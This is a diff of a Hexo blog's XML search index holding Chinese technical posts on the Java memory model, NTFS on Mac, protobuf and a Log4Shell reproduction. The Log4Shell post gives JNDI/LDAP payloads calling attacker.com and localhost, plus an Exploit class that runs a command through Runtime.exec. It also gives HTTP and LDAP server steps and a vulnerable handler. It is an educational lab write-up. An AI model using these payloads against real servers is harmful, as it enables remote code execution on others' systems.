-<p><a href="https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/">https://cshihong.github.io/2018/05/22/Hive%E6%8A%80%E6%9C%AF%E5%8E%9F%E7%90%86/</a></p>
-<p><a href="https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5">https://www.infoq.cn/article/fxl2qxxcq-aex14ee8x5</a></p>
-]]></content>
-      <categories>
-        <category>大数据</category>
-      </categories>
-      <tags>
-        <tag>druid</tag>
-        <tag>hive</tag>
-        <tag>大数据</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>hexo deploy 指定 git 账户</title>
     <url>/hexodeploy-edit-gitaccount.html</url>
     <content><![CDATA[<h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>hexo deploy默认使用全局的git user.name user.email，通过设置自定义 git 用户</p>
@@ -578,24 +596,6 @@
         <tag>Http</tag>
         <tag>HttpClient</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>Hello World</title>
-    <url>/hello-world.html</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
   </entry>
   <entry>
     <title>java常量池</title>
@@ -790,6 +790,61 @@
       </tags>
   </entry>
   <entry>
+    <title>java内存模型</title>
+    <url>/java-memory-model.html</url>
+    <content><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="现代计算机物理内存模型"><a href="#现代计算机物理内存模型" class="headerlink" title="现代计算机物理内存模型"></a>现代计算机物理内存模型</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/memory_model_physical.png" alt="物理内存模型"></p>
+<p><strong>访问局部性</strong>（英语：Locality of reference）</p>
+<blockquote>
+<p>访问局部性分为两种基本形式，一种是时间局部性，另一种是空间局部性。时间局部性指的是，程序在运行时，最近刚刚被引用过的一个内存位置容易再次被引用，比如在调取一个函数的时候，前不久才调取过的本地参数容易再度被调取使用。空间局部性指的是，最近引用过的内存位置以及其周边的内存位置容易再次被使用。空间局部性比较常见于循环中，比如在一个数列中，如果第3个元素在上一个循环中使用，则本次循环中极有可能会使用第4个元素。</p>
+</blockquote>
+<span id="more"></span>
+
+<h3 id="指令重排序"><a href="#指令重排序" class="headerlink" title="指令重排序"></a>指令重排序</h3><p>指令重排序是为了提高程序性能做得优化，比如多次写操作，每次都要会写内存，可以在线程的 working memory 操作完成后，一起回写内存。</p>
+<p>指令重排序包括：</p>
+<ul>
+<li>编译器优化重排序</li>
+<li>指令级并行重排序</li>
+<li>内存系统的重排序</li>
+</ul>
+<h4 id="as-if-serial"><a href="#as-if-serial" class="headerlink" title="as-if-serial"></a>as-if-serial</h4><p>无论如何重排序,程序执行的结果都应该与代码顺序执行的结果一致(Java编译器,运行时和处理器都会保证java在单线程下遵循as-if-serial语义).</p>
+<h4 id="线程的-working-memory"><a href="#线程的-working-memory" class="headerlink" title="线程的 working memory"></a>线程的 working memory</h4><p>是 cache 和寄存器的抽象，解释源于《Concurrent Programming in Java: Design Principles and Patterns, Second Edition》，而不单单是内存的某个部分</p>
+<h2 id="Java-内存模型（Java-Memory-Model）"><a href="#Java-内存模型（Java-Memory-Model）" class="headerlink" title="Java 内存模型（Java Memory Model）"></a>Java 内存模型（Java Memory Model）</h2><p>Java内存模型(Java Memory Model)描述了Java程序中各种变量(线程共享变量)的访问规则,以及在JVM中将变量存储到内存和从内存中读取出变量这样的底层细节.</p>
+<h3 id="happens-before-原则"><a href="#happens-before-原则" class="headerlink" title="happens-before 原则"></a>happens-before 原则</h3><p>规定了 java 指令操作的偏序关系。是 JMM 制定的一些偏序关系，用于保证内存的可见性。</p>
+<p>8大 happens-before 原则：</p>
+<ul>
+<li>单线程happen-before原则：在同一个线程中，书写在前面的操作happen-before后面的操作。</li>
+<li>锁的happen-before原则：同一个锁的unlock操作happen-before此锁的lock操作。</li>
+<li>volatile的happen-before原则：对一个volatile变量的写操作happen-before对此变量的任意操作(当然也包括写操作了)。</li>
+<li>happen-before的传递性原则：如果A操作 happen-before B操作，B操作happen-before C操作，那么A操作happen-before C操作。</li>
+<li>线程启动的happen-before原则：同一个线程的start方法happen-before此线程的其它方法。</li>
+<li>线程中断的happen-before原则：对线程interrupt方法的调用happen-before被中断线程的检测到中断发送的代码。</li>
+<li>线程终结的happen-before原则：线程中的所有操作都happen-before线程的终止检测。</li>
+<li>对象创建的happen-before原则：一个对象的初始化完成先于他的finalize方法调用。</li>
+</ul>
+<h3 id="内存可见性"><a href="#内存可见性" class="headerlink" title="内存可见性"></a>内存可见性</h3><h4 id="共享变量实现可见性原理"><a href="#共享变量实现可见性原理" class="headerlink" title="共享变量实现可见性原理"></a>共享变量实现可见性原理</h4><p>线程1对共享变量的修改对线程2可见，需要2个步骤：</p>
+<ul>
+<li>将工作内存1中修改的共享变量刷新到主内存</li>
+<li>将主内存最新的共享变量更新到工作内存2</li>
+</ul>
+<h4 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h4><p>JMM 关于synchronized 的两条规定：</p>
+<ul>
+<li>线程解锁前，刷新共享变量到主存</li>
+<li>线程加锁前，获取主存中共享变量最新值到工作内存</li>
+</ul>
+<h4 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h4><p>有内存栅栏（或内存屏障）和防止指令重排序</p>
+<p>JMM 中，在 volatile 变量写操作后加入 store 栅栏（(强制将变量值刷新到主内存中去)），在读操作前加入 load 栅栏（强制从主内存中读取变量的值）</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/1508eedba54d">https://www.jianshu.com/p/1508eedba54d</a><br><a href="https://www.jianshu.com/p/47f999a7c280">https://www.jianshu.com/p/47f999a7c280</a><br><a href="http://ifeve.com/easy-happens-before/">http://ifeve.com/easy-happens-before/</a></p>
+]]></content>
+      <categories>
+        <category>java进阶</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>jvm</tag>
+        <tag>jmm</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>jvm参数</title>
     <url>/jvm-options.html</url>
     <content><![CDATA[<h2 id="X-与-XX-的区别"><a href="#X-与-XX-的区别" class="headerlink" title="-X 与 -XX 的区别"></a>-X 与 -XX 的区别</h2><blockquote>
@@ -973,58 +1028,35 @@
       </tags>
   </entry>
   <entry>
-    <title>java内存模型</title>
-    <url>/java-memory-model.html</url>
-    <content><![CDATA[<h2 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h2><h3 id="现代计算机物理内存模型"><a href="#现代计算机物理内存模型" class="headerlink" title="现代计算机物理内存模型"></a>现代计算机物理内存模型</h3><p><img data-src="https://raw.githubusercontent.com/zhouxinghang/resources/master/ZBlog/memory_model_physical.png" alt="物理内存模型"></p>
-<p><strong>访问局部性</strong>（英语：Locality of reference）</p>
-<blockquote>
-<p>访问局部性分为两种基本形式，一种是时间局部性，另一种是空间局部性。时间局部性指的是，程序在运行时，最近刚刚被引用过的一个内存位置容易再次被引用，比如在调取一个函数的时候，前不久才调取过的本地参数容易再度被调取使用。空间局部性指的是，最近引用过的内存位置以及其周边的内存位置容易再次被使用。空间局部性比较常见于循环中，比如在一个数列中，如果第3个元素在上一个循环中使用，则本次循环中极有可能会使用第4个元素。</p>
-</blockquote>
-<span id="more"></span>
+    <title>log4j2 远程执行漏洞原理与复现</title>
+    <url>/log4j2-rce.html</url>
+    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>使用了 log4j2，2.0~ 2.14.1 版本的均有影响</p>
+<p><a href="https://news.ycombinator.com/item?id=29499867">像Steam，Apple iCloud</a>这样的云服务以及像Minecraft这样的应用程序已经被发现容易受到攻击。</p>
+<h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>引用了 log4j2 漏洞版本的服务器</p>
+<p>黑客服务器（ladp + http）</p>
+<p>从该请求中注入字符串的日志语句</p>
+<h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><ol>
+<li>发送包含恶意字符串的请求（通过任何协议）</li>
+<li>服务器记录请求中数据。包含恶意有效负载：（其中是攻击者控制的服务器），<code>$&#123;jndi:ldap://attacker.com/a&#125;</code></li>
+<li>该漏洞由此有效负载触发，服务器通过<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">“Java 命名和目录接口</a>“（JNDI）发出请求，<code>log4j</code> <code>attacker.com/a</code></li>
+<li>此响应包含注入服务器进程的远程 Java 类文件（例如 ）的路径，<code>http://second-stage.attacker.com/Exploit.class</code></li>
+<li>此注入的有效负载会触发第二阶段，并允许攻击者执行任意代码。</li>
+</ol>
+<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>具体的代码见 github：<a href="https://github.com/zhouxinghang/log4j2-rce">zhouxinghang/log4j2-rce: log4j2 remote code execution sample (github.com)</a></p>
+<h4 id="编写攻击类"><a href="#编写攻击类" class="headerlink" title="编写攻击类"></a>编写攻击类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 要执行的命令</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line">            Process pc = Runtime.getRuntime().exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
-<h3 id="指令重排序"><a href="#指令重排序" class="headerlink" title="指令重排序"></a>指令重排序</h3><p>指令重排序是为了提高程序性能做得优化，比如多次写操作，每次都要会写内存，可以在线程的 working memory 操作完成后，一起回写内存。</p>
-<p>指令重排序包括：</p>
-<ul>
-<li>编译器优化重排序</li>
-<li>指令级并行重排序</li>
-<li>内存系统的重排序</li>
-</ul>
-<h4 id="as-if-serial"><a href="#as-if-serial" class="headerlink" title="as-if-serial"></a>as-if-serial</h4><p>无论如何重排序,程序执行的结果都应该与代码顺序执行的结果一致(Java编译器,运行时和处理器都会保证java在单线程下遵循as-if-serial语义).</p>
-<h4 id="线程的-working-memory"><a href="#线程的-working-memory" class="headerlink" title="线程的 working memory"></a>线程的 working memory</h4><p>是 cache 和寄存器的抽象，解释源于《Concurrent Programming in Java: Design Principles and Patterns, Second Edition》，而不单单是内存的某个部分</p>
-<h2 id="Java-内存模型（Java-Memory-Model）"><a href="#Java-内存模型（Java-Memory-Model）" class="headerlink" title="Java 内存模型（Java Memory Model）"></a>Java 内存模型（Java Memory Model）</h2><p>Java内存模型(Java Memory Model)描述了Java程序中各种变量(线程共享变量)的访问规则,以及在JVM中将变量存储到内存和从内存中读取出变量这样的底层细节.</p>
-<h3 id="happens-before-原则"><a href="#happens-before-原则" class="headerlink" title="happens-before 原则"></a>happens-before 原则</h3><p>规定了 java 指令操作的偏序关系。是 JMM 制定的一些偏序关系，用于保证内存的可见性。</p>
-<p>8大 happens-before 原则：</p>
-<ul>
-<li>单线程happen-before原则：在同一个线程中，书写在前面的操作happen-before后面的操作。</li>
-<li>锁的happen-before原则：同一个锁的unlock操作happen-before此锁的lock操作。</li>
-<li>volatile的happen-before原则：对一个volatile变量的写操作happen-before对此变量的任意操作(当然也包括写操作了)。</li>
-<li>happen-before的传递性原则：如果A操作 happen-before B操作，B操作happen-before C操作，那么A操作happen-before C操作。</li>
-<li>线程启动的happen-before原则：同一个线程的start方法happen-before此线程的其它方法。</li>
-<li>线程中断的happen-before原则：对线程interrupt方法的调用happen-before被中断线程的检测到中断发送的代码。</li>
-<li>线程终结的happen-before原则：线程中的所有操作都happen-before线程的终止检测。</li>
-<li>对象创建的happen-before原则：一个对象的初始化完成先于他的finalize方法调用。</li>
-</ul>
-<h3 id="内存可见性"><a href="#内存可见性" class="headerlink" title="内存可见性"></a>内存可见性</h3><h4 id="共享变量实现可见性原理"><a href="#共享变量实现可见性原理" class="headerlink" title="共享变量实现可见性原理"></a>共享变量实现可见性原理</h4><p>线程1对共享变量的修改对线程2可见，需要2个步骤：</p>
-<ul>
-<li>将工作内存1中修改的共享变量刷新到主内存</li>
-<li>将主内存最新的共享变量更新到工作内存2</li>
-</ul>
-<h4 id="synchronized"><a href="#synchronized" class="headerlink" title="synchronized"></a>synchronized</h4><p>JMM 关于synchronized 的两条规定：</p>
-<ul>
-<li>线程解锁前，刷新共享变量到主存</li>
-<li>线程加锁前，获取主存中共享变量最新值到工作内存</li>
-</ul>
-<h4 id="volatile"><a href="#volatile" class="headerlink" title="volatile"></a>volatile</h4><p>有内存栅栏（或内存屏障）和防止指令重排序</p>
-<p>JMM 中，在 volatile 变量写操作后加入 store 栅栏（(强制将变量值刷新到主内存中去)），在读操作前加入 load 栅栏（强制从主内存中读取变量的值）</p>
-<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.jianshu.com/p/1508eedba54d">https://www.jianshu.com/p/1508eedba54d</a><br><a href="https://www.jianshu.com/p/47f999a7c280">https://www.jianshu.com/p/47f999a7c280</a><br><a href="http://ifeve.com/easy-happens-before/">http://ifeve.com/easy-happens-before/</a></p>
+<p>会在 mac 系统上启动计算器</p>
+<h4 id="开启-http-服务"><a href="#开启-http-服务" class="headerlink" title="开启 http 服务"></a>开启 http 服务</h4><p>将攻击类 Exploit.java 编译成 Exploit.class 文件。并在 class 目录下启动 Http 服务，用于远程下载攻击类。<code>python3 -m http.server 8100</code></p>
+<h4 id="开启-LDAP-服务"><a href="#开启-LDAP-服务" class="headerlink" title="开启 LDAP 服务"></a>开启 LDAP 服务</h4><p>启动 <code>LDAPRefServer</code> 类，监听 ladp 请求，响应远程 Java 类文件的路径，<a href="http://127.0.0.1:8100/Exploit.class%E3%80%82%E8%A2%AB%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E4%BC%9A%E6%89%A7%E8%A1%8C%E8%AF%A5%E8%BF%9C%E7%A8%8B%E7%B1%BB">http://127.0.0.1:8100/Exploit.class。被攻击服务会执行该远程类</a></p>
+<h4 id="被攻击服务"><a href="#被攻击服务" class="headerlink" title="被攻击服务"></a>被攻击服务</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerableLog4jExampleHandler</span> <span class="keyword">implements</span> <span class="title">HttpHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * A simple HTTP endpoint that reads the request&#x27;s User Agent and logs it back.</span></span><br><span class="line"><span class="comment">   * This is basically pseudo-code to explain the vulnerability, and not a full example.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> he HTTP Request Object</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpExchange he)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String userAgent = he.getRequestHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.</span></span><br><span class="line">    <span class="comment">// The attacker can set their User-Agent header to: $&#123;jndi:ldap://attacker.com/a&#125;</span></span><br><span class="line">    log.info(<span class="string">&quot;Request User Agent:&#123;&#125;&quot;</span>, userAgent);</span><br><span class="line"></span><br><span class="line">    String response = <span class="string">&quot;&lt;h1&gt;Hello There, &quot;</span> + userAgent + <span class="string">&quot;!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    he.sendResponseHeaders(<span class="number">200</span>, response.length());</span><br><span class="line">    OutputStream os = he.getResponseBody();</span><br><span class="line">    os.write(response.getBytes());</span><br><span class="line">    os.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在请求被攻击服务时候，设置 <code>user-agent = $&#123;jndi:ldap://127.0.0.1:1389/a&#125;</code>。log4j2 打印 user-agent 值就会执行远程类。</p>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://twitter.com/chvancooten/status/1469340927923826691">Cas van Cooten 在 Twitter： “A story in three part 😶 #log4j https://t.co/XMl02BcaJY” / Twitter</a></p>
+<p><a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">marshalsec/LDAPRefServer.java at master · mbechler/marshalsec (github.com)</a></p>
 ]]></content>
-      <categories>
-        <category>java进阶</category>
-      </categories>
       <tags>
-        <tag>java</tag>
-        <tag>jvm</tag>
-        <tag>jmm</tag>
+        <tag>log4j</tag>
+        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
@@ -1108,6 +1140,36 @@
       </tags>
   </entry>
   <entry>
+    <title>Mac 实现 NTFS 格式硬盘读写</title>
+    <url>/mac-NTFS.html</url>
+    <content><![CDATA[<h2 id="理论"><a href="#理论" class="headerlink" title="理论"></a>理论</h2><p>Mac本身是支持NTFS写入的，只是NTFS是微软开发，由于版权和一些技术细节原因，苹果不愿公开说自己支持NTFS写入，也是有自己以后可能不支持NTFS写入的考量</p>
+<span id="more"></span>
+
+<h2 id="操作流程"><a href="#操作流程" class="headerlink" title="操作流程"></a>操作流程</h2><ol>
+<li>挂载上你的NTFS硬盘，查看硬盘名称</li>
+<li>编辑/etc/fstab文件，使其支持NTFS写入</li>
+<li>将/Volumes中的NTFS磁盘快捷方式到Finder</li>
+</ol>
+<h2 id="详细流程"><a href="#详细流程" class="headerlink" title="详细流程"></a>详细流程</h2><ol>
+<li>插上硬盘后，查看你的硬盘名称，这里假设名称是AngleDisk</li>
+<li>打开Applications的Terminal, 你也可以直接spotlight输入terminal打开</li>
+<li>在终端输入sudo nano /etc/fstab 敲击回车</li>
+<li>现在你看到了一个编辑界面，输入LABEL=AngleDisk none ntfs rw,auto,nobrowse后，敲击回车，再Ctrl+X，再敲击Y，再敲击回车</li>
+<li>此时，退出你的移动硬盘，再重新插入，你会发现磁盘没有显示在桌面或是Finder之前出现的地方，别慌</li>
+<li>打开Finder，Command+Shift+G，输入框中输入/Volumes，回车，你就可以看到你的磁盘啦！是可以读写的哟，Enjoy</li>
+<li>方便起见，你可以直接把磁盘拖到Finder侧边栏中，这样下次使用就不用进入到/Volumes目录打开le</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.zhihu.com/question/19571334">https://www.zhihu.com/question/19571334</a></p>
+]]></content>
+      <categories>
+        <category>101</category>
+      </categories>
+      <tags>
+        <tag>mac</tag>
+        <tag>ntfs</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>nginx实现原理</title>
     <url>/nginx-implement.html</url>
     <content><![CDATA[<h2 id="简单理解-Nginx"><a href="#简单理解-Nginx" class="headerlink" title="简单理解 Nginx"></a>简单理解 Nginx</h2><p>nginx 是静态 web 服务器，意思是 engine x。并发量高，性能优越</p>
@@ -1164,71 +1226,71 @@
       </tags>
   </entry>
   <entry>
-    <title>log4j2 远程执行漏洞原理与复现</title>
-    <url>/log4j2-rce.html</url>
-    <content><![CDATA[<h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>使用了 log4j2，2.0~ 2.14.1 版本的均有影响</p>
-<p><a href="https://news.ycombinator.com/item?id=29499867">像Steam，Apple iCloud</a>这样的云服务以及像Minecraft这样的应用程序已经被发现容易受到攻击。</p>
-<h2 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h2><h3 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h3><p>引用了 log4j2 漏洞版本的服务器</p>
-<p>黑客服务器（ladp + http）</p>
-<p>从该请求中注入字符串的日志语句</p>
-<h3 id="漏洞利用步骤"><a href="#漏洞利用步骤" class="headerlink" title="漏洞利用步骤"></a>漏洞利用步骤</h3><ol>
-<li>发送包含恶意字符串的请求（通过任何协议）</li>
-<li>服务器记录请求中数据。包含恶意有效负载：（其中是攻击者控制的服务器），<code>$&#123;jndi:ldap://attacker.com/a&#125;</code></li>
-<li>该漏洞由此有效负载触发，服务器通过<a href="https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf">“Java 命名和目录接口</a>“（JNDI）发出请求，<code>log4j</code> <code>attacker.com/a</code></li>
-<li>此响应包含注入服务器进程的远程 Java 类文件（例如 ）的路径，<code>http://second-stage.attacker.com/Exploit.class</code></li>
-<li>此注入的有效负载会触发第二阶段，并允许攻击者执行任意代码。</li>
-</ol>
-<h3 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h3><p>具体的代码见 github：<a href="https://github.com/zhouxinghang/log4j2-rce">zhouxinghang/log4j2-rce: log4j2 remote code execution sample (github.com)</a></p>
-<h4 id="编写攻击类"><a href="#编写攻击类" class="headerlink" title="编写攻击类"></a>编写攻击类</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="comment">// 要执行的命令</span></span><br><span class="line">            String[] commands = &#123;<span class="string">&quot;open&quot;</span>, <span class="string">&quot;/System/Applications/Calculator.app&quot;</span>&#125;;</span><br><span class="line">            Process pc = Runtime.getRuntime().exec(commands);</span><br><span class="line">            pc.waitFor();</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] argv)</span> </span>&#123;</span><br><span class="line">        Exploit e = <span class="keyword">new</span> Exploit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+    <title>protobuf 安装使用</title>
+    <url>/protobuf-use.html</url>
+    <content><![CDATA[<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><ul>
+<li><p>官网下载 <a href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a></p>
+</li>
+<li><p>解压，cd 到目录下</p>
+</li>
+<li><p>./configure</p>
+</li>
+<li><p>make</p>
+</li>
+<li><p>make check</p>
+</li>
+<li><p>sudo make install</p>
+</li>
+<li><p>which protoc</p>
+</li>
+<li><p>protoc –version</p>
+<span id="more"></span></li>
+</ul>
+<h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="编写proto文件（idl文件）"><a href="#编写proto文件（idl文件）" class="headerlink" title="编写proto文件（idl文件）"></a>编写proto文件（idl文件）</h3><p>一个名为 Person.proto文件如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">syntax=&quot;proto3&quot;; </span><br><span class="line">option java_package = &quot;org.serialization.protobuf.quickstart&quot;;   </span><br><span class="line">option java_outer_classname = &quot;PersonProtobuf&quot;;   </span><br><span class="line">message Person  &#123;   </span><br><span class="line">  int32 age = 1;</span><br><span class="line">  string name = 2;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
 
-<p>会在 mac 系统上启动计算器</p>
-<h4 id="开启-http-服务"><a href="#开启-http-服务" class="headerlink" title="开启 http 服务"></a>开启 http 服务</h4><p>将攻击类 Exploit.java 编译成 Exploit.class 文件。并在 class 目录下启动 Http 服务，用于远程下载攻击类。<code>python3 -m http.server 8100</code></p>
-<h4 id="开启-LDAP-服务"><a href="#开启-LDAP-服务" class="headerlink" title="开启 LDAP 服务"></a>开启 LDAP 服务</h4><p>启动 <code>LDAPRefServer</code> 类，监听 ladp 请求，响应远程 Java 类文件的路径，<a href="http://127.0.0.1:8100/Exploit.class%E3%80%82%E8%A2%AB%E6%94%BB%E5%87%BB%E6%9C%8D%E5%8A%A1%E4%BC%9A%E6%89%A7%E8%A1%8C%E8%AF%A5%E8%BF%9C%E7%A8%8B%E7%B1%BB">http://127.0.0.1:8100/Exploit.class。被攻击服务会执行该远程类</a></p>
-<h4 id="被攻击服务"><a href="#被攻击服务" class="headerlink" title="被攻击服务"></a>被攻击服务</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">VulnerableLog4jExampleHandler</span> <span class="keyword">implements</span> <span class="title">HttpHandler</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">static</span> Logger log = LogManager.getLogger(VulnerableLog4jExampleHandler.class.getName());</span><br><span class="line"></span><br><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * A simple HTTP endpoint that reads the request&#x27;s User Agent and logs it back.</span></span><br><span class="line"><span class="comment">   * This is basically pseudo-code to explain the vulnerability, and not a full example.</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> he HTTP Request Object</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handle</span><span class="params">(HttpExchange he)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    String userAgent = he.getRequestHeader(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// This line triggers the RCE by logging the attacker-controlled HTTP User Agent header.</span></span><br><span class="line">    <span class="comment">// The attacker can set their User-Agent header to: $&#123;jndi:ldap://attacker.com/a&#125;</span></span><br><span class="line">    log.info(<span class="string">&quot;Request User Agent:&#123;&#125;&quot;</span>, userAgent);</span><br><span class="line"></span><br><span class="line">    String response = <span class="string">&quot;&lt;h1&gt;Hello There, &quot;</span> + userAgent + <span class="string">&quot;!&lt;/h1&gt;&quot;</span>;</span><br><span class="line">    he.sendResponseHeaders(<span class="number">200</span>, response.length());</span><br><span class="line">    OutputStream os = he.getResponseBody();</span><br><span class="line">    os.write(response.getBytes());</span><br><span class="line">    os.close();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h3 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h3><p>使用 protoc 编译器，将 proto 文件编译成 java 文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">protoc --java_out=./ Person.proto</span><br></pre></td></tr></table></figure>
 
-<p>在请求被攻击服务时候，设置 <code>user-agent = $&#123;jndi:ldap://127.0.0.1:1389/a&#125;</code>。log4j2 打印 user-agent 值就会执行远程类。</p>
